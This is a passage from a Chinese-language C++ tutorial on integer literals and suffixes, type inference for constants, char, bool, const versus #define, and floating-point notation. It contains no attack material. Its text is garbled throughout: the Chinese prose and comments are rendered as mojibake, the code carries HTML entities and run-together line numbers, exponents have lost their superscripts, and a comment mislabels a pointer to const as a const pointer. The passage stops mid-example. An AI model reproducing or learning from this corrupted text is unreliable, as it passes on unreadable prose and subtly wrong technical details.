42ã€‚C++å…è®¸ä»¥ä¸åŒçš„è¿›åˆ¶ï¼ˆåŸºæ•°ï¼‰ä¹¦å†™æ•´å‹å­—é¢å€¼ï¼š åè¿›åˆ¶ (Decimal): æœ€å¸¸è§çš„å½¢å¼ï¼Œä»¥éé›¶æ•°å­—å¼€å¤´ï¼ˆé™¤éæ˜¯æ•°å­—0æœ¬èº«ï¼‰ã€‚ä¾‹å¦‚ï¼š10, 255, 0, 12345ã€‚ å…«è¿›åˆ¶ (Octal): ä»¥ 0 å¼€å¤´ã€‚åªåŒ…å«æ•°å­— 0-7ã€‚ä¾‹å¦‚ï¼š012 (ç­‰äºåè¿›åˆ¶çš„ 10)ï¼Œ077 (ç­‰äºåè¿›åˆ¶çš„ 63)ã€‚ç°ä»£C++ä¸­åº”è°¨æ…ä½¿ç”¨ï¼Œå®¹æ˜“ä¸åè¿›åˆ¶æ··æ·†ã€‚ åå…­è¿›åˆ¶ (Hexadecimal): ä»¥ 0x æˆ– 0X å¼€å¤´ã€‚åŒ…å«æ•°å­— 0-9 å’Œå­—æ¯ a-f (æˆ– A-F)ï¼Œå¤§å°å†™ä¸æ•æ„Ÿã€‚ä¾‹å¦‚ï¼š0xA (ç­‰äºåè¿›åˆ¶çš„ 10)ï¼Œ0xFF (ç­‰äºåè¿›åˆ¶çš„ 255)ï¼Œ0x1a2bã€‚å¸¸ç”¨äºè¡¨ç¤ºå†…å­˜åœ°å€æˆ–ä½æ¨¡å¼ã€‚ äºŒè¿›åˆ¶ (Binary) (C++14): ä»¥ 0b æˆ– 0B å¼€å¤´ã€‚åªåŒ…å«æ•°å­— 0 å’Œ 1ã€‚ä¾‹å¦‚ï¼š0b1010 (ç­‰äºåè¿›åˆ¶çš„ 10)ï¼Œ0b11111111 (ç­‰äºåè¿›åˆ¶çš„ 255)ã€‚ åç¼€ (Suffixes): å¯ä»¥é€šè¿‡åœ¨å­—é¢å€¼åé¢æ·»åŠ åç¼€æ¥æ˜¾å¼æŒ‡å®šå…¶ç±»å‹ï¼š u æˆ– U: è¡¨ç¤º unsigned ç±»å‹ (unsigned int, unsigned long, unsigned long long)ã€‚ l æˆ– L: è¡¨ç¤º long æˆ– unsigned long ç±»å‹ã€‚ ll æˆ– LL: è¡¨ç¤º long long æˆ– unsigned long long ç±»å‹ (C++11)ã€‚ åç¼€å¯ä»¥ç»„åˆä½¿ç”¨ï¼Œä¾‹å¦‚ ul, UL, ull, ULL, lu, llu ç­‰ï¼ˆé¡ºåºå’Œå¤§å°å†™ä¸é‡è¦ï¼‰ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 12345678910111213141516171819202122232425262728#include &lt;iostream&gt;int main() &#123; int decimal_val = 100; int octal_val = 0144; // 1*64 + 4*8 + 4*1 = 64 + 32 + 4 = 100 (åè¿›åˆ¶) int hex_val = 0x64; // 6*16 + 4*1 = 96 + 4 = 100 (åè¿›åˆ¶) // int binary_val = 0b1100100; // C++14: 64 + 32 + 4 = 100 (åè¿›åˆ¶) std::cout &lt;&lt; &quot;Decimal: &quot; &lt;&lt; decimal_val &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Octal (0144): &quot; &lt;&lt; octal_val &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Hexadecimal (0x64): &quot; &lt;&lt; hex_val &lt;&lt; std::endl; // std::cout &lt;&lt; &quot;Binary (0b1100100): &quot; &lt;&lt; binary_val &lt;&lt; std::endl; // éœ€è¦ C++14 ç¼–è¯‘å™¨ // ä½¿ç”¨åç¼€ unsigned int u_val = 100U; long l_val = 200000L; unsigned long ul_val = 300000UL; long long ll_val = 4000000000LL; unsigned long long ull_val = 5000000000ULL; std::cout &lt;&lt; &quot;Unsigned int: &quot; &lt;&lt; u_val &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Long: &quot; &lt;&lt; l_val &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Unsigned long: &quot; &lt;&lt; ul_val &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Long long: &quot; &lt;&lt; ll_val &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Unsigned long long: &quot; &lt;&lt; ull_val &lt;&lt; std::endl; return 0;&#125; 3.1.7 C++å¦‚ä½•ç¡®å®šå¸¸é‡çš„ç±»å‹å½“ä½ å†™ä¸‹ä¸€ä¸ªæ•´å‹å­—é¢å€¼ï¼ˆå¸¸é‡ï¼‰è€Œæ²¡æœ‰æŒ‡å®šåç¼€æ—¶ï¼ŒC++ç¼–è¯‘å™¨ä¼šæ ¹æ®å…¶å€¼æ¥æ¨æ–­å…¶ç±»å‹ã€‚ è§„åˆ™: åè¿›åˆ¶å¸¸é‡: ç¼–è¯‘å™¨ä¼šé€‰æ‹©èƒ½å®¹çº³è¯¥å€¼çš„æœ€å°çš„æœ‰ç¬¦å·ç±»å‹ï¼Œä¾æ¬¡å°è¯•ï¼šint, long, long long (C++11)ã€‚ä¾‹å¦‚ï¼š 100 ä¼šè¢«è®¤ä¸ºæ˜¯ int (å¦‚æœ int èƒ½å®¹çº³)ã€‚ 3000000000 ä¼šè¢«è®¤ä¸ºæ˜¯ long (å¦‚æœ int ä¸èƒ½å®¹çº³ä½† long å¯ä»¥)ï¼Œæˆ–è€… long long (å¦‚æœ int å’Œ long éƒ½ä¸èƒ½å®¹çº³ä½† long long å¯ä»¥)ã€‚ å…«è¿›åˆ¶æˆ–åå…­è¿›åˆ¶å¸¸é‡: ç¼–è¯‘å™¨ä¼šé€‰æ‹©èƒ½å®¹çº³è¯¥å€¼çš„æœ€å°ç±»å‹ï¼Œä¾æ¬¡å°è¯•ï¼šint, unsigned int, long, unsigned long, long long (C++11), unsigned long long (C++11)ã€‚æ³¨æ„è¿™é‡ŒåŒ…å«äº† unsigned ç±»å‹ã€‚ ä¸ºä»€ä¹ˆè¦çŸ¥é“è¿™ä¸ª? è¿™åœ¨æ¶‰åŠç±»å‹è½¬æ¢å’Œå‡½æ•°é‡è½½æ—¶å¯èƒ½å¾ˆé‡è¦ã€‚å¦‚æœä½ ä¼ é€’ä¸€ä¸ªå¸¸é‡ç»™å‡½æ•°ï¼Œå®ƒçš„é»˜è®¤ç±»å‹å¯èƒ½ä¼šå½±å“å“ªä¸ªé‡è½½ç‰ˆæœ¬è¢«è°ƒç”¨ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include &lt;iostream&gt;#include &lt;typeinfo&gt; // ç”¨äº typeid (ä»…ä½œæ¼”ç¤º)void process(int n) &#123; std::cout &lt;&lt; &quot;Processing int: &quot; &lt;&lt; n &lt;&lt; std::endl;&#125;void process(unsigned int n) &#123; std::cout &lt;&lt; &quot;Processing unsigned int: &quot; &lt;&lt; n &lt;&lt; std::endl;&#125;void process(long n) &#123; std::cout &lt;&lt; &quot;Processing long: &quot; &lt;&lt; n &lt;&lt; std::endl;&#125;void process(unsigned long n) &#123; std::cout &lt;&lt; &quot;Processing unsigned long: &quot; &lt;&lt; n &lt;&lt; std::endl;&#125;void process(long long n) &#123; // C++11 std::cout &lt;&lt; &quot;Processing long long: &quot; &lt;&lt; n &lt;&lt; std::endl;&#125;void process(unsigned long long n) &#123; // C++11 std::cout &lt;&lt; &quot;Processing unsigned long long: &quot; &lt;&lt; n &lt;&lt; std::endl;&#125;int main() &#123; std::cout &lt;&lt; &quot;Type of 100: &quot;; process(100); // é€šå¸¸è°ƒç”¨ process(int) // å‡è®¾ int æ˜¯ 32 ä½ï¼Œæœ€å¤§å€¼çº¦ 21 äº¿ std::cout &lt;&lt; &quot;Type of 3000000000: &quot;; // å¦‚æœ int æ˜¯ 32 ä½ï¼Œè¿™ä¸ªå€¼è¶…å‡ºäº† int èŒƒå›´ // ç¼–è¯‘å™¨ä¼šå°è¯• long æˆ– long long process(3000000000); // å¯èƒ½è°ƒç”¨ process(long) æˆ– process(long long) std::cout &lt;&lt; &quot;Type of 0xFFFFFFFF: &quot;; // è¿™ä¸ªåå…­è¿›åˆ¶æ•° (ç­‰äº 4294967295) // å¦‚æœ int æ˜¯ 32 ä½ï¼Œå®ƒè¶…å‡ºäº†æœ‰ç¬¦å· int çš„èŒƒå›´ // ç¼–è¯‘å™¨ä¼šå°è¯• unsigned int, long, unsigned long... process(0xFFFFFFFF); // å¯èƒ½è°ƒç”¨ process(unsigned int) æˆ– process(unsigned long)ç­‰ // ä½¿ç”¨åç¼€æ˜ç¡®ç±»å‹ std::cout &lt;&lt; &quot;Type of 150L: &quot;; process(150L); // æ˜ç¡®è°ƒç”¨ process(long) std::cout &lt;&lt; &quot;Type of 200U: &quot;; process(200U); // æ˜ç¡®è°ƒç”¨ process(unsigned int) std::cout &lt;&lt; &quot;Type of 5000000000LL: &quot;; process(5000000000LL); // æ˜ç¡®è°ƒç”¨ process(long long) return 0;&#125; å…³é”®ç‚¹: å¦‚æœä¸ç¡®å®šå¸¸é‡ä¼šè¢«æ¨æ–­æˆä»€ä¹ˆç±»å‹ï¼Œæˆ–è€…æƒ³è¦ç¡®ä¿å®ƒæ˜¯ç‰¹å®šç±»å‹ï¼Œæœ€å¥½ä½¿ç”¨åç¼€ã€‚ 3.1.8 charç±»å‹ï¼šå­—ç¬¦å’Œå°æ•´æ•°char ç±»å‹æ˜¯å¦ä¸€ç§æ•´å‹ç±»å‹ï¼Œå®ƒè¢«è®¾è®¡ç”¨æ¥å­˜å‚¨**å­—ç¬¦ (character)**ï¼Œä¾‹å¦‚å­—æ¯ã€æ•°å­—ã€æ ‡ç‚¹ç¬¦å·ç­‰ã€‚ ç‰¹ç‚¹: å¤§å°: char é€šå¸¸å ç”¨ 1 ä¸ªå­—èŠ‚ï¼ˆ8ä½ï¼‰çš„å†…å­˜ã€‚è¿™æ˜¯C++æ ‡å‡†ä¿è¯çš„ (sizeof(char) æ€»æ˜¯ 1)ã€‚ å­—ç¬¦è¡¨ç¤º: è®¡ç®—æœºå†…éƒ¨ä½¿ç”¨æ•°å€¼ç¼–ç ï¼ˆå¦‚ ASCII æˆ– Unicode çš„å­é›†ï¼‰æ¥è¡¨ç¤ºå­—ç¬¦ã€‚char å˜é‡å­˜å‚¨çš„æ˜¯è¿™äº›å­—ç¬¦å¯¹åº”çš„æ•´æ•°ç¼–ç ã€‚ å­—ç¬¦å­—é¢å€¼: ä½¿ç”¨å•å¼•å· &#39; &#39; æ‹¬èµ·æ¥è¡¨ç¤ºå•ä¸ªå­—ç¬¦å­—é¢å€¼ï¼Œä¾‹å¦‚ &#39;A&#39;, &#39;a&#39;, &#39;5&#39;, &#39;?&#39;, &#39;\\n&#39; (æ¢è¡Œç¬¦)ã€‚ æ•´æ•°ç±»å‹: char æœ¬è´¨ä¸Šä»ç„¶æ˜¯ä¸€ä¸ªæ•´æ•°ç±»å‹ã€‚å®ƒå¯ä»¥å‚ä¸ç®—æœ¯è¿ç®—ã€‚ æœ‰ç¬¦å· vs æ— ç¬¦å·: char ç±»å‹å…·ä½“æ˜¯æœ‰ç¬¦å· (signed char) è¿˜æ˜¯æ— ç¬¦å· (unsigned char) å–å†³äºç¼–è¯‘å™¨å®ç°ã€‚å¦‚æœä½ éœ€è¦æ˜ç¡®ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ signed char æˆ– unsigned charã€‚ signed char: èŒƒå›´é€šå¸¸æ˜¯ -128 åˆ° 127ã€‚ unsigned char: èŒƒå›´é€šå¸¸æ˜¯ 0 åˆ° 255ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;iostream&gt;int main() &#123; char grade = &#x27;A&#x27;; // å­˜å‚¨å­—ç¬¦ &#x27;A&#x27; char initial = &#x27;J&#x27;; char symbol = &#x27;$&#x27;; char newline = &#x27;\\n&#x27;; // å­˜å‚¨æ¢è¡Œç¬¦ (è½¬ä¹‰åºåˆ—) std::cout &lt;&lt; &quot;Your grade is: &quot; &lt;&lt; grade &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Initial: &quot; &lt;&lt; initial &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Symbol: &quot; &lt;&lt; symbol &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Printing a newline:&quot; &lt;&lt; newline; // è¾“å‡ºä¸€ä¸ªæ¢è¡Œ std::cout &lt;&lt; &quot;After newline.&quot; &lt;&lt; std::endl; // cout ä¼šå°† char ç±»å‹è§£é‡Šä¸ºå­—ç¬¦è¿›è¡Œæ‰“å° // å¦‚æœæƒ³çœ‹åˆ°å­—ç¬¦å¯¹åº”çš„æ•´æ•°ç¼–ç ï¼Œéœ€è¦è¿›è¡Œç±»å‹è½¬æ¢ std::cout &lt;&lt; &quot;The integer code for &#x27;A&#x27; is: &quot; &lt;&lt; int(grade) &lt;&lt; std::endl; std::cout &lt;&lt; &quot;The integer code for &#x27;$&#x27; is: &quot; &lt;&lt; static_cast&lt;int&gt;(symbol) &lt;&lt; std::endl; // char ä½œä¸ºå°æ•´æ•°ä½¿ç”¨ char small_num = 65; // 65 æ˜¯ ASCII ç ä¸­ &#x27;A&#x27; çš„å€¼ std::cout &lt;&lt; &quot;Character with code 65: &quot; &lt;&lt; small_num &lt;&lt; std::endl; // è¾“å‡º &#x27;A&#x27; // ç®—æœ¯è¿ç®— char next_char = grade + 1; // &#x27;A&#x27; çš„ç¼–ç åŠ  1 å¾—åˆ° &#x27;B&#x27; çš„ç¼–ç  std::cout &lt;&lt; &quot;Character after &#x27;A&#x27;: &quot; &lt;&lt; next_char &lt;&lt; std::endl; // è¾“å‡º &#x27;B&#x27; // è¾“å…¥å­—ç¬¦ char response; std::cout &lt;&lt; &quot;Enter a character: &quot;; std::cin &gt;&gt; response; // è¯»å–ä¸€ä¸ªå­—ç¬¦ std::cout &lt;&lt; &quot;You entered: &quot; &lt;&lt; response &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Its code is: &quot; &lt;&lt; int(response) &lt;&lt; std::endl; // æ˜ç¡®ä½¿ç”¨ signed/unsigned char signed char sc = -5; unsigned char uc = 250; std::cout &lt;&lt; &quot;Signed char: &quot; &lt;&lt; int(sc) &lt;&lt; std::endl; // è½¬æ¢ä¸º int æ‰“å°æ•°å€¼ std::cout &lt;&lt; &quot;Unsigned char: &quot; &lt;&lt; int(uc) &lt;&lt; std::endl; return 0;&#125; è½¬ä¹‰åºåˆ— (Escape Sequence):ä»¥åæ–œæ  \\ å¼€å¤´çš„ç‰¹æ®Šå­—ç¬¦åºåˆ—ï¼Œç”¨äºè¡¨ç¤ºæ— æ³•ç›´æ¥è¾“å…¥çš„å­—ç¬¦æˆ–å…·æœ‰ç‰¹æ®Šå«ä¹‰çš„å­—ç¬¦ã€‚å¸¸ç”¨è½¬ä¹‰åºåˆ—åŒ…æ‹¬ï¼š \\n: æ¢è¡Œç¬¦ \\t: æ°´å¹³åˆ¶è¡¨ç¬¦ (Tab) \\r: å›è½¦ç¬¦ \\\\: åæ–œæ æœ¬èº« \\&#39;: å•å¼•å· \\&quot;: åŒå¼•å· \\?: é—®å· \\0: ç©ºå­—ç¬¦ (Null character) \\xhh: ç”¨ä¸¤ä½åå…­è¿›åˆ¶æ•° hh è¡¨ç¤ºå­—ç¬¦ \\ooo: ç”¨æœ€å¤šä¸‰ä½å…«è¿›åˆ¶æ•° ooo è¡¨ç¤ºå­—ç¬¦ 3.1.9 boolç±»å‹bool ç±»å‹æ˜¯C++ä¸­çš„å¸ƒå°” (Boolean) ç±»å‹ï¼Œç”¨äºè¡¨ç¤ºé€»è¾‘å€¼ï¼šçœŸ (true) æˆ– **å‡ (false)**ã€‚ ç‰¹ç‚¹: å–å€¼: bool å˜é‡åªèƒ½å­˜å‚¨ä¸¤ä¸ªå€¼ï¼štrue å’Œ falseã€‚è¿™ä¸¤ä¸ªæ˜¯C++å…³é”®å­—ã€‚ æ•´æ•°è½¬æ¢: åœ¨éœ€è¦æ•´æ•°çš„åœ°æ–¹ï¼Œtrue ä¼šè¢«è½¬æ¢ä¸º 1ï¼Œfalse ä¼šè¢«è½¬æ¢ä¸º 0ã€‚ åœ¨éœ€è¦å¸ƒå°”å€¼çš„åœ°æ–¹ï¼Œä»»ä½•éé›¶æ•´æ•°å€¼ä¼šè¢«è½¬æ¢ä¸º trueï¼Œé›¶å€¼ä¼šè¢«è½¬æ¢ä¸º falseã€‚æŒ‡é’ˆç±»å‹ä¹Ÿå¯ä»¥è½¬æ¢ä¸º boolï¼ˆç©ºæŒ‡é’ˆä¸º falseï¼Œéç©ºæŒ‡é’ˆä¸º trueï¼‰ã€‚ å¤§å°: bool ç±»å‹çš„å¤§å°æ²¡æœ‰ä¸¥æ ¼è§„å®šï¼Œä½†é€šå¸¸æ˜¯ 1 ä¸ªå­—èŠ‚ï¼Œå³ä½¿å®ƒåªéœ€è¦ 1 ä½æ¥å­˜å‚¨ä¿¡æ¯ã€‚ ç”¨é€”: ä¸»è¦ç”¨äºå­˜å‚¨æ¡ä»¶åˆ¤æ–­ï¼ˆå¦‚ if è¯­å¥ã€å¾ªç¯æ¡ä»¶ï¼‰çš„ç»“æœã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &lt;iostream&gt;int main() &#123; bool isReady = true; // å£°æ˜å¹¶åˆå§‹åŒ–ä¸º true bool hasError = false; // å£°æ˜å¹¶åˆå§‹åŒ–ä¸º false bool isEmpty; // æœªåˆå§‹åŒ– (å€¼ä¸ç¡®å®š) isEmpty = false; // èµ‹å€¼ std::cout &lt;&lt; &quot;isReady (default output): &quot; &lt;&lt; isReady &lt;&lt; std::endl; // é€šå¸¸è¾“å‡º 1 std::cout &lt;&lt; &quot;hasError (default output): &quot; &lt;&lt; hasError &lt;&lt; std::endl; // é€šå¸¸è¾“å‡º 0 std::cout &lt;&lt; &quot;isEmpty (default output): &quot; &lt;&lt; isEmpty &lt;&lt; std::endl; // è¾“å‡º 0 // ä½¿ç”¨ std::boolalpha æ§åˆ¶ç¬¦ä»¥ &quot;true&quot;/&quot;false&quot; å½¢å¼è¾“å‡º std::cout &lt;&lt; std::boolalpha; std::cout &lt;&lt; &quot;isReady (boolalpha): &quot; &lt;&lt; isReady &lt;&lt; std::endl; // è¾“å‡º true std::cout &lt;&lt; &quot;hasError (boolalpha): &quot; &lt;&lt; hasError &lt;&lt; std::endl; // è¾“å‡º false std::cout &lt;&lt; &quot;isEmpty (boolalpha): &quot; &lt;&lt; isEmpty &lt;&lt; std::endl; // è¾“å‡º false std::cout &lt;&lt; std::noboolalpha; // å…³é—­ boolalpha æ ¼å¼ // bool å’Œæ•´æ•°è½¬æ¢ int ready_int = isReady; // ready_int å˜ä¸º 1 int error_int = hasError; // error_int å˜ä¸º 0 std::cout &lt;&lt; &quot;isReady as int: &quot; &lt;&lt; ready_int &lt;&lt; std::endl; std::cout &lt;&lt; &quot;hasError as int: &quot; &lt;&lt; error_int &lt;&lt; std::endl; bool from_int_non_zero = 100; // 100 (éé›¶) è½¬æ¢ä¸º true bool from_int_zero = 0; // 0 è½¬æ¢ä¸º false std::cout &lt;&lt; std::boolalpha; std::cout &lt;&lt; &quot;Bool from 100: &quot; &lt;&lt; from_int_non_zero &lt;&lt; std::endl; // è¾“å‡º true std::cout &lt;&lt; &quot;Bool from 0: &quot; &lt;&lt; from_int_zero &lt;&lt; std::endl; // è¾“å‡º false // åœ¨æ¡ä»¶è¯­å¥ä¸­ä½¿ç”¨ if (isReady) &#123; std::cout &lt;&lt; &quot;System is ready.&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;System is not ready.&quot; &lt;&lt; std::endl; &#125; if (!hasError) &#123; // ! æ˜¯é€»è¾‘éè¿ç®—ç¬¦ std::cout &lt;&lt; &quot;No errors detected.&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;An error occurred.&quot; &lt;&lt; std::endl; &#125; return 0;&#125; 3.2 consté™å®šç¬¦ç°åœ¨æˆ‘ä»¬æ¥æ¢è®¨ä¸€ç§åœ¨C++ä¸­åˆ›å»ºå¸¸é‡ (Constant) çš„æ›´å¯é çš„æ–¹æ³•ï¼šä½¿ç”¨ const é™å®šç¬¦ã€‚å¸¸é‡æ˜¯æŒ‡åœ¨ç¨‹åºè¿è¡ŒæœŸé—´å…¶å€¼ä¸èƒ½è¢«ä¿®æ”¹çš„é‡ã€‚ const æ˜¯ä¸€ä¸ª**ç±»å‹é™å®šç¬¦ (Type Qualifier)**ï¼Œå®ƒç”¨äºä¿®æ”¹å˜é‡çš„å£°æ˜ï¼Œä½¿å…¶æˆä¸ºåªè¯»ã€‚ ä½œç”¨: åˆ›å»ºç¬¦å·å¸¸é‡: const å…è®¸ä½ ä¸ºå¸¸é‡å€¼ï¼ˆå¦‚åœ†å‘¨ç‡ã€æœ€å¤§å°è¯•æ¬¡æ•°ç­‰ï¼‰èµ‹äºˆä¸€ä¸ªæœ‰æ„ä¹‰çš„åç§°ï¼Œæé«˜ä»£ç çš„å¯è¯»æ€§å’Œå¯ç»´æŠ¤æ€§ã€‚ é˜²æ­¢æ„å¤–ä¿®æ”¹: ä¸€æ—¦å˜é‡è¢«å£°æ˜ä¸º const å¹¶åˆå§‹åŒ–åï¼Œç¼–è¯‘å™¨ä¼šé˜»æ­¢ä»»ä½•è¯•å›¾ä¿®æ”¹è¯¥å˜é‡å€¼çš„ä»£ç ã€‚è¿™æœ‰åŠ©äºé˜²æ­¢å› æ„å¤–èµ‹å€¼è€Œå¯¼è‡´çš„é”™è¯¯ã€‚ ç±»å‹å®‰å…¨: ä¸ä½¿ç”¨ #define åˆ›å»ºå®å¸¸é‡ç›¸æ¯”ï¼Œconst å¸¸é‡å…·æœ‰æ˜ç¡®çš„æ•°æ®ç±»å‹ï¼Œç¼–è¯‘å™¨å¯ä»¥å¯¹å…¶è¿›è¡Œç±»å‹æ£€æŸ¥ï¼Œæ›´åŠ å®‰å…¨ã€‚ ä½œç”¨åŸŸ: const å¸¸é‡éµå¾ªæ ‡å‡†çš„ä½œç”¨åŸŸè§„åˆ™ï¼ˆä¾‹å¦‚ï¼Œåœ¨å‡½æ•°å†…éƒ¨å®šä¹‰çš„ const å¸¸é‡åªåœ¨è¯¥å‡½æ•°å†…æœ‰æ•ˆï¼‰ï¼Œè€Œ #define å®æ˜¯å…¨å±€æ›¿æ¢ã€‚ å£°æ˜å’Œåˆå§‹åŒ–: å£°æ˜ const å˜é‡çš„è¯­æ³•æ˜¯åœ¨ç±»å‹åå‰æˆ–ç±»å‹åååŠ ä¸Š const å…³é”®å­—ã€‚å…³é”®åœ¨äºï¼Œconst å˜é‡å¿…é¡»åœ¨å£°æ˜æ—¶è¿›è¡Œåˆå§‹åŒ–ï¼Œå› ä¸ºä¹‹åå°±ä¸èƒ½å†ç»™å®ƒèµ‹å€¼äº†ã€‚ 123const type variableName = value; // æˆ–è€…type const variableName = value; // ä¸¤ç§å†™æ³•ç­‰æ•ˆï¼Œç¬¬ä¸€ç§æ›´å¸¸è§ ç”¨æ³•ä¸ç¤ºä¾‹: 123456789101112131415161718192021222324252627282930#include &lt;iostream&gt;int main() &#123; // å£°æ˜å¹¶åˆå§‹åŒ– const å˜é‡ const int MONTHS_IN_YEAR = 12; // å¸¸é‡ï¼Œè¡¨ç¤ºä¸€å¹´ä¸­çš„æœˆä»½æ•° const double PI = 3.14159; const char* GREETING = &quot;Hello, world!&quot;; // æŒ‡å‘å¸¸é‡å­—ç¬¦ä¸²çš„å¸¸é‡æŒ‡é’ˆ (æ›´å¤æ‚ï¼Œåç»­ç« èŠ‚è¯¦è§£) // å°è¯•ä¿®æ”¹ const å˜é‡ä¼šå¯¼è‡´ç¼–è¯‘é”™è¯¯ // MONTHS_IN_YEAR = 13; // é”™è¯¯! ä¸èƒ½ç»™ const å˜é‡èµ‹å€¼ std::cout &lt;&lt; &quot;Months in a year: &quot; &lt;&lt; MONTHS_IN_YEAR &lt;&lt; std::endl; double radius = 5.0; double circumference = 2 * PI * radius; // ä½¿ç”¨ const å¸¸é‡ PI std::cout &lt;&lt; &quot;Circumference: &quot; &lt;&lt; circumference &lt;&lt; std::endl; // const å¸¸é‡ä¹Ÿéµå¾ªä½œç”¨åŸŸè§„åˆ™ if (true) &#123; const int MAX_TRIES = 3; // åªåœ¨ if å—å†…æœ‰æ•ˆ std::cout &lt;&lt; &quot;Max tries inside block: &quot; &lt;&lt; MAX_TRIES &lt;&lt; std::endl; &#125; // std::cout &lt;&lt; MAX_TRIES; // é”™è¯¯! MAX_TRIES åœ¨æ­¤ä½œç”¨åŸŸå¤–ä¸å¯è§ // å¿…é¡»åœ¨å£°æ˜æ—¶åˆå§‹åŒ– // const int DAYS_IN_WEEK; // é”™è¯¯! const å˜é‡éœ€è¦åˆå§‹åŒ– // DAYS_IN_WEEK = 7; return 0;&#125; const ä¸ #define çš„æ¯”è¾ƒ: åœ¨ C è¯­è¨€ä¸­ï¼Œé€šå¸¸ä½¿ç”¨ #define é¢„å¤„ç†å™¨æŒ‡ä»¤æ¥åˆ›å»ºç¬¦å·å¸¸é‡ï¼š 1#define MONTHS_IN_YEAR 12 // C é£æ ¼å®å®šä¹‰ è™½ç„¶ #define ä¹Ÿèƒ½è¾¾åˆ°ç±»ä¼¼ç›®çš„ï¼Œä½† const åœ¨ C++ ä¸­é€šå¸¸æ˜¯æ›´å¥½çš„é€‰æ‹©ï¼š ç±»å‹å®‰å…¨: const å¸¸é‡æœ‰æ˜ç¡®çš„æ•°æ®ç±»å‹ï¼Œç¼–è¯‘å™¨ä¼šè¿›è¡Œç±»å‹æ£€æŸ¥ã€‚#define åªæ˜¯ç®€å•çš„æ–‡æœ¬æ›¿æ¢ï¼Œæ²¡æœ‰ç±»å‹ä¿¡æ¯ï¼Œå¯èƒ½å¯¼è‡´æ„å¤–é”™è¯¯ã€‚ ä½œç”¨åŸŸ: const å¸¸é‡éµå¾ª C++ çš„ä½œç”¨åŸŸè§„åˆ™ï¼Œå¯ä»¥åˆ›å»ºå±€éƒ¨å¸¸é‡ã€‚#define å®é€šå¸¸æ˜¯å…¨å±€çš„ï¼ˆä»å®šä¹‰ç‚¹åˆ°æ–‡ä»¶å°¾ï¼‰ï¼Œå®¹æ˜“é€ æˆå‘½åå†²çªã€‚ è°ƒè¯•: const å¸¸é‡åœ¨è°ƒè¯•å™¨ä¸­é€šå¸¸å¯è§ï¼Œæœ‰ç¬¦å·åã€‚#define å®åœ¨ç¼–è¯‘å‰å°±è¢«æ›¿æ¢æ‰äº†ï¼Œè°ƒè¯•æ—¶å¯èƒ½åªèƒ½çœ‹åˆ°æ›¿æ¢åçš„å­—é¢å€¼ã€‚ ç±»ä½œç”¨åŸŸ: const å¯ä»¥ç”¨äºå®šä¹‰ç±»ä½œç”¨åŸŸå†…çš„å¸¸é‡ï¼ˆç±»æˆå‘˜ï¼‰ï¼Œè€Œ #define ä¸èƒ½ç›´æ¥åšåˆ°è¿™ä¸€ç‚¹ã€‚ ä¸€èˆ¬å»ºè®®: åœ¨ C++ ä¸­ï¼Œä¼˜å…ˆä½¿ç”¨ const æ¥å®šä¹‰ç¬¦å·å¸¸é‡ï¼Œè€Œä¸æ˜¯ #defineã€‚ 3.3 æµ®ç‚¹æ•°æµ®ç‚¹æ•°æ˜¯C++ä¸­ç”¨äºè¡¨ç¤ºå¸¦å°æ•°éƒ¨åˆ†çš„æ•°å­—ï¼ˆå®æ•°ï¼‰çš„ç±»å‹ã€‚å®ƒä»¬å¯ä»¥è¡¨ç¤ºéå¸¸å¤§æˆ–éå¸¸å°çš„æ•°å€¼ï¼Œä»¥åŠæ•´æ•°æ— æ³•è¡¨ç¤ºçš„å°æ•°ã€‚ 3.3.1 ä¹¦å†™æµ®ç‚¹æ•°C++å…è®¸ä½¿ç”¨ä¸¤ç§æ–¹å¼æ¥ä¹¦å†™æµ®ç‚¹å­—é¢å€¼ï¼ˆå¸¸é‡ï¼‰ï¼š æ ‡å‡†å°æ•°ç‚¹è¡¨ç¤ºæ³• (Standard Decimal Point Notation): åŒ…å«ä¸€ä¸ªå°æ•°ç‚¹ã€‚ ä¾‹å¦‚ï¼š12.34, 0.0, 99., .5 (ç­‰åŒäº 0.5), -1.67ã€‚ Eè¡¨ç¤ºæ³• (E Notation) æˆ–ç§‘å­¦è®°æ•°æ³• (Scientific Notation): ç”¨äºè¡¨ç¤ºéå¸¸å¤§æˆ–éå¸¸å°çš„æ•°ã€‚ æ ¼å¼ä¸ºï¼šmantissaEexponent æˆ– mantissaeexponentã€‚ mantissa (å°¾æ•°) æ˜¯ä¸€ä¸ªæ•°å­—ï¼ˆå¯ä»¥å¸¦å°æ•°ç‚¹ï¼‰ã€‚ E æˆ– e è¡¨ç¤º â€œä¹˜ä»¥10çš„â€¦æ¬¡å¹‚â€ã€‚ exponent (æŒ‡æ•°) æ˜¯ä¸€ä¸ªæ•´æ•°ï¼ˆå¯ä»¥ä¸ºè´Ÿï¼‰ã€‚ ä¾‹å¦‚ï¼š 3.45E6 è¡¨ç¤º 3.45 * 106 (å³ 3,450,000)ã€‚ 2.5e-4 è¡¨ç¤º 2.5 * 10-4 (å³ 0.00025)ã€‚ 9E12 è¡¨ç¤º 9 * 1012ã€‚ -1.23e+3 è¡¨ç¤º -1.23 * 103 (å³ -1230)ã€‚ æ³¨æ„: Eè¡¨ç¤ºæ³•ä¸­ï¼ŒE æˆ– e å‰åä¸èƒ½æœ‰ç©ºæ ¼ã€‚ æŒ‡æ•°å¿…é¡»æ˜¯æ•´æ•°ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 12345678910111213141516171819202122232425262728#include &lt;iostream&gt;int main() &#123; // æ 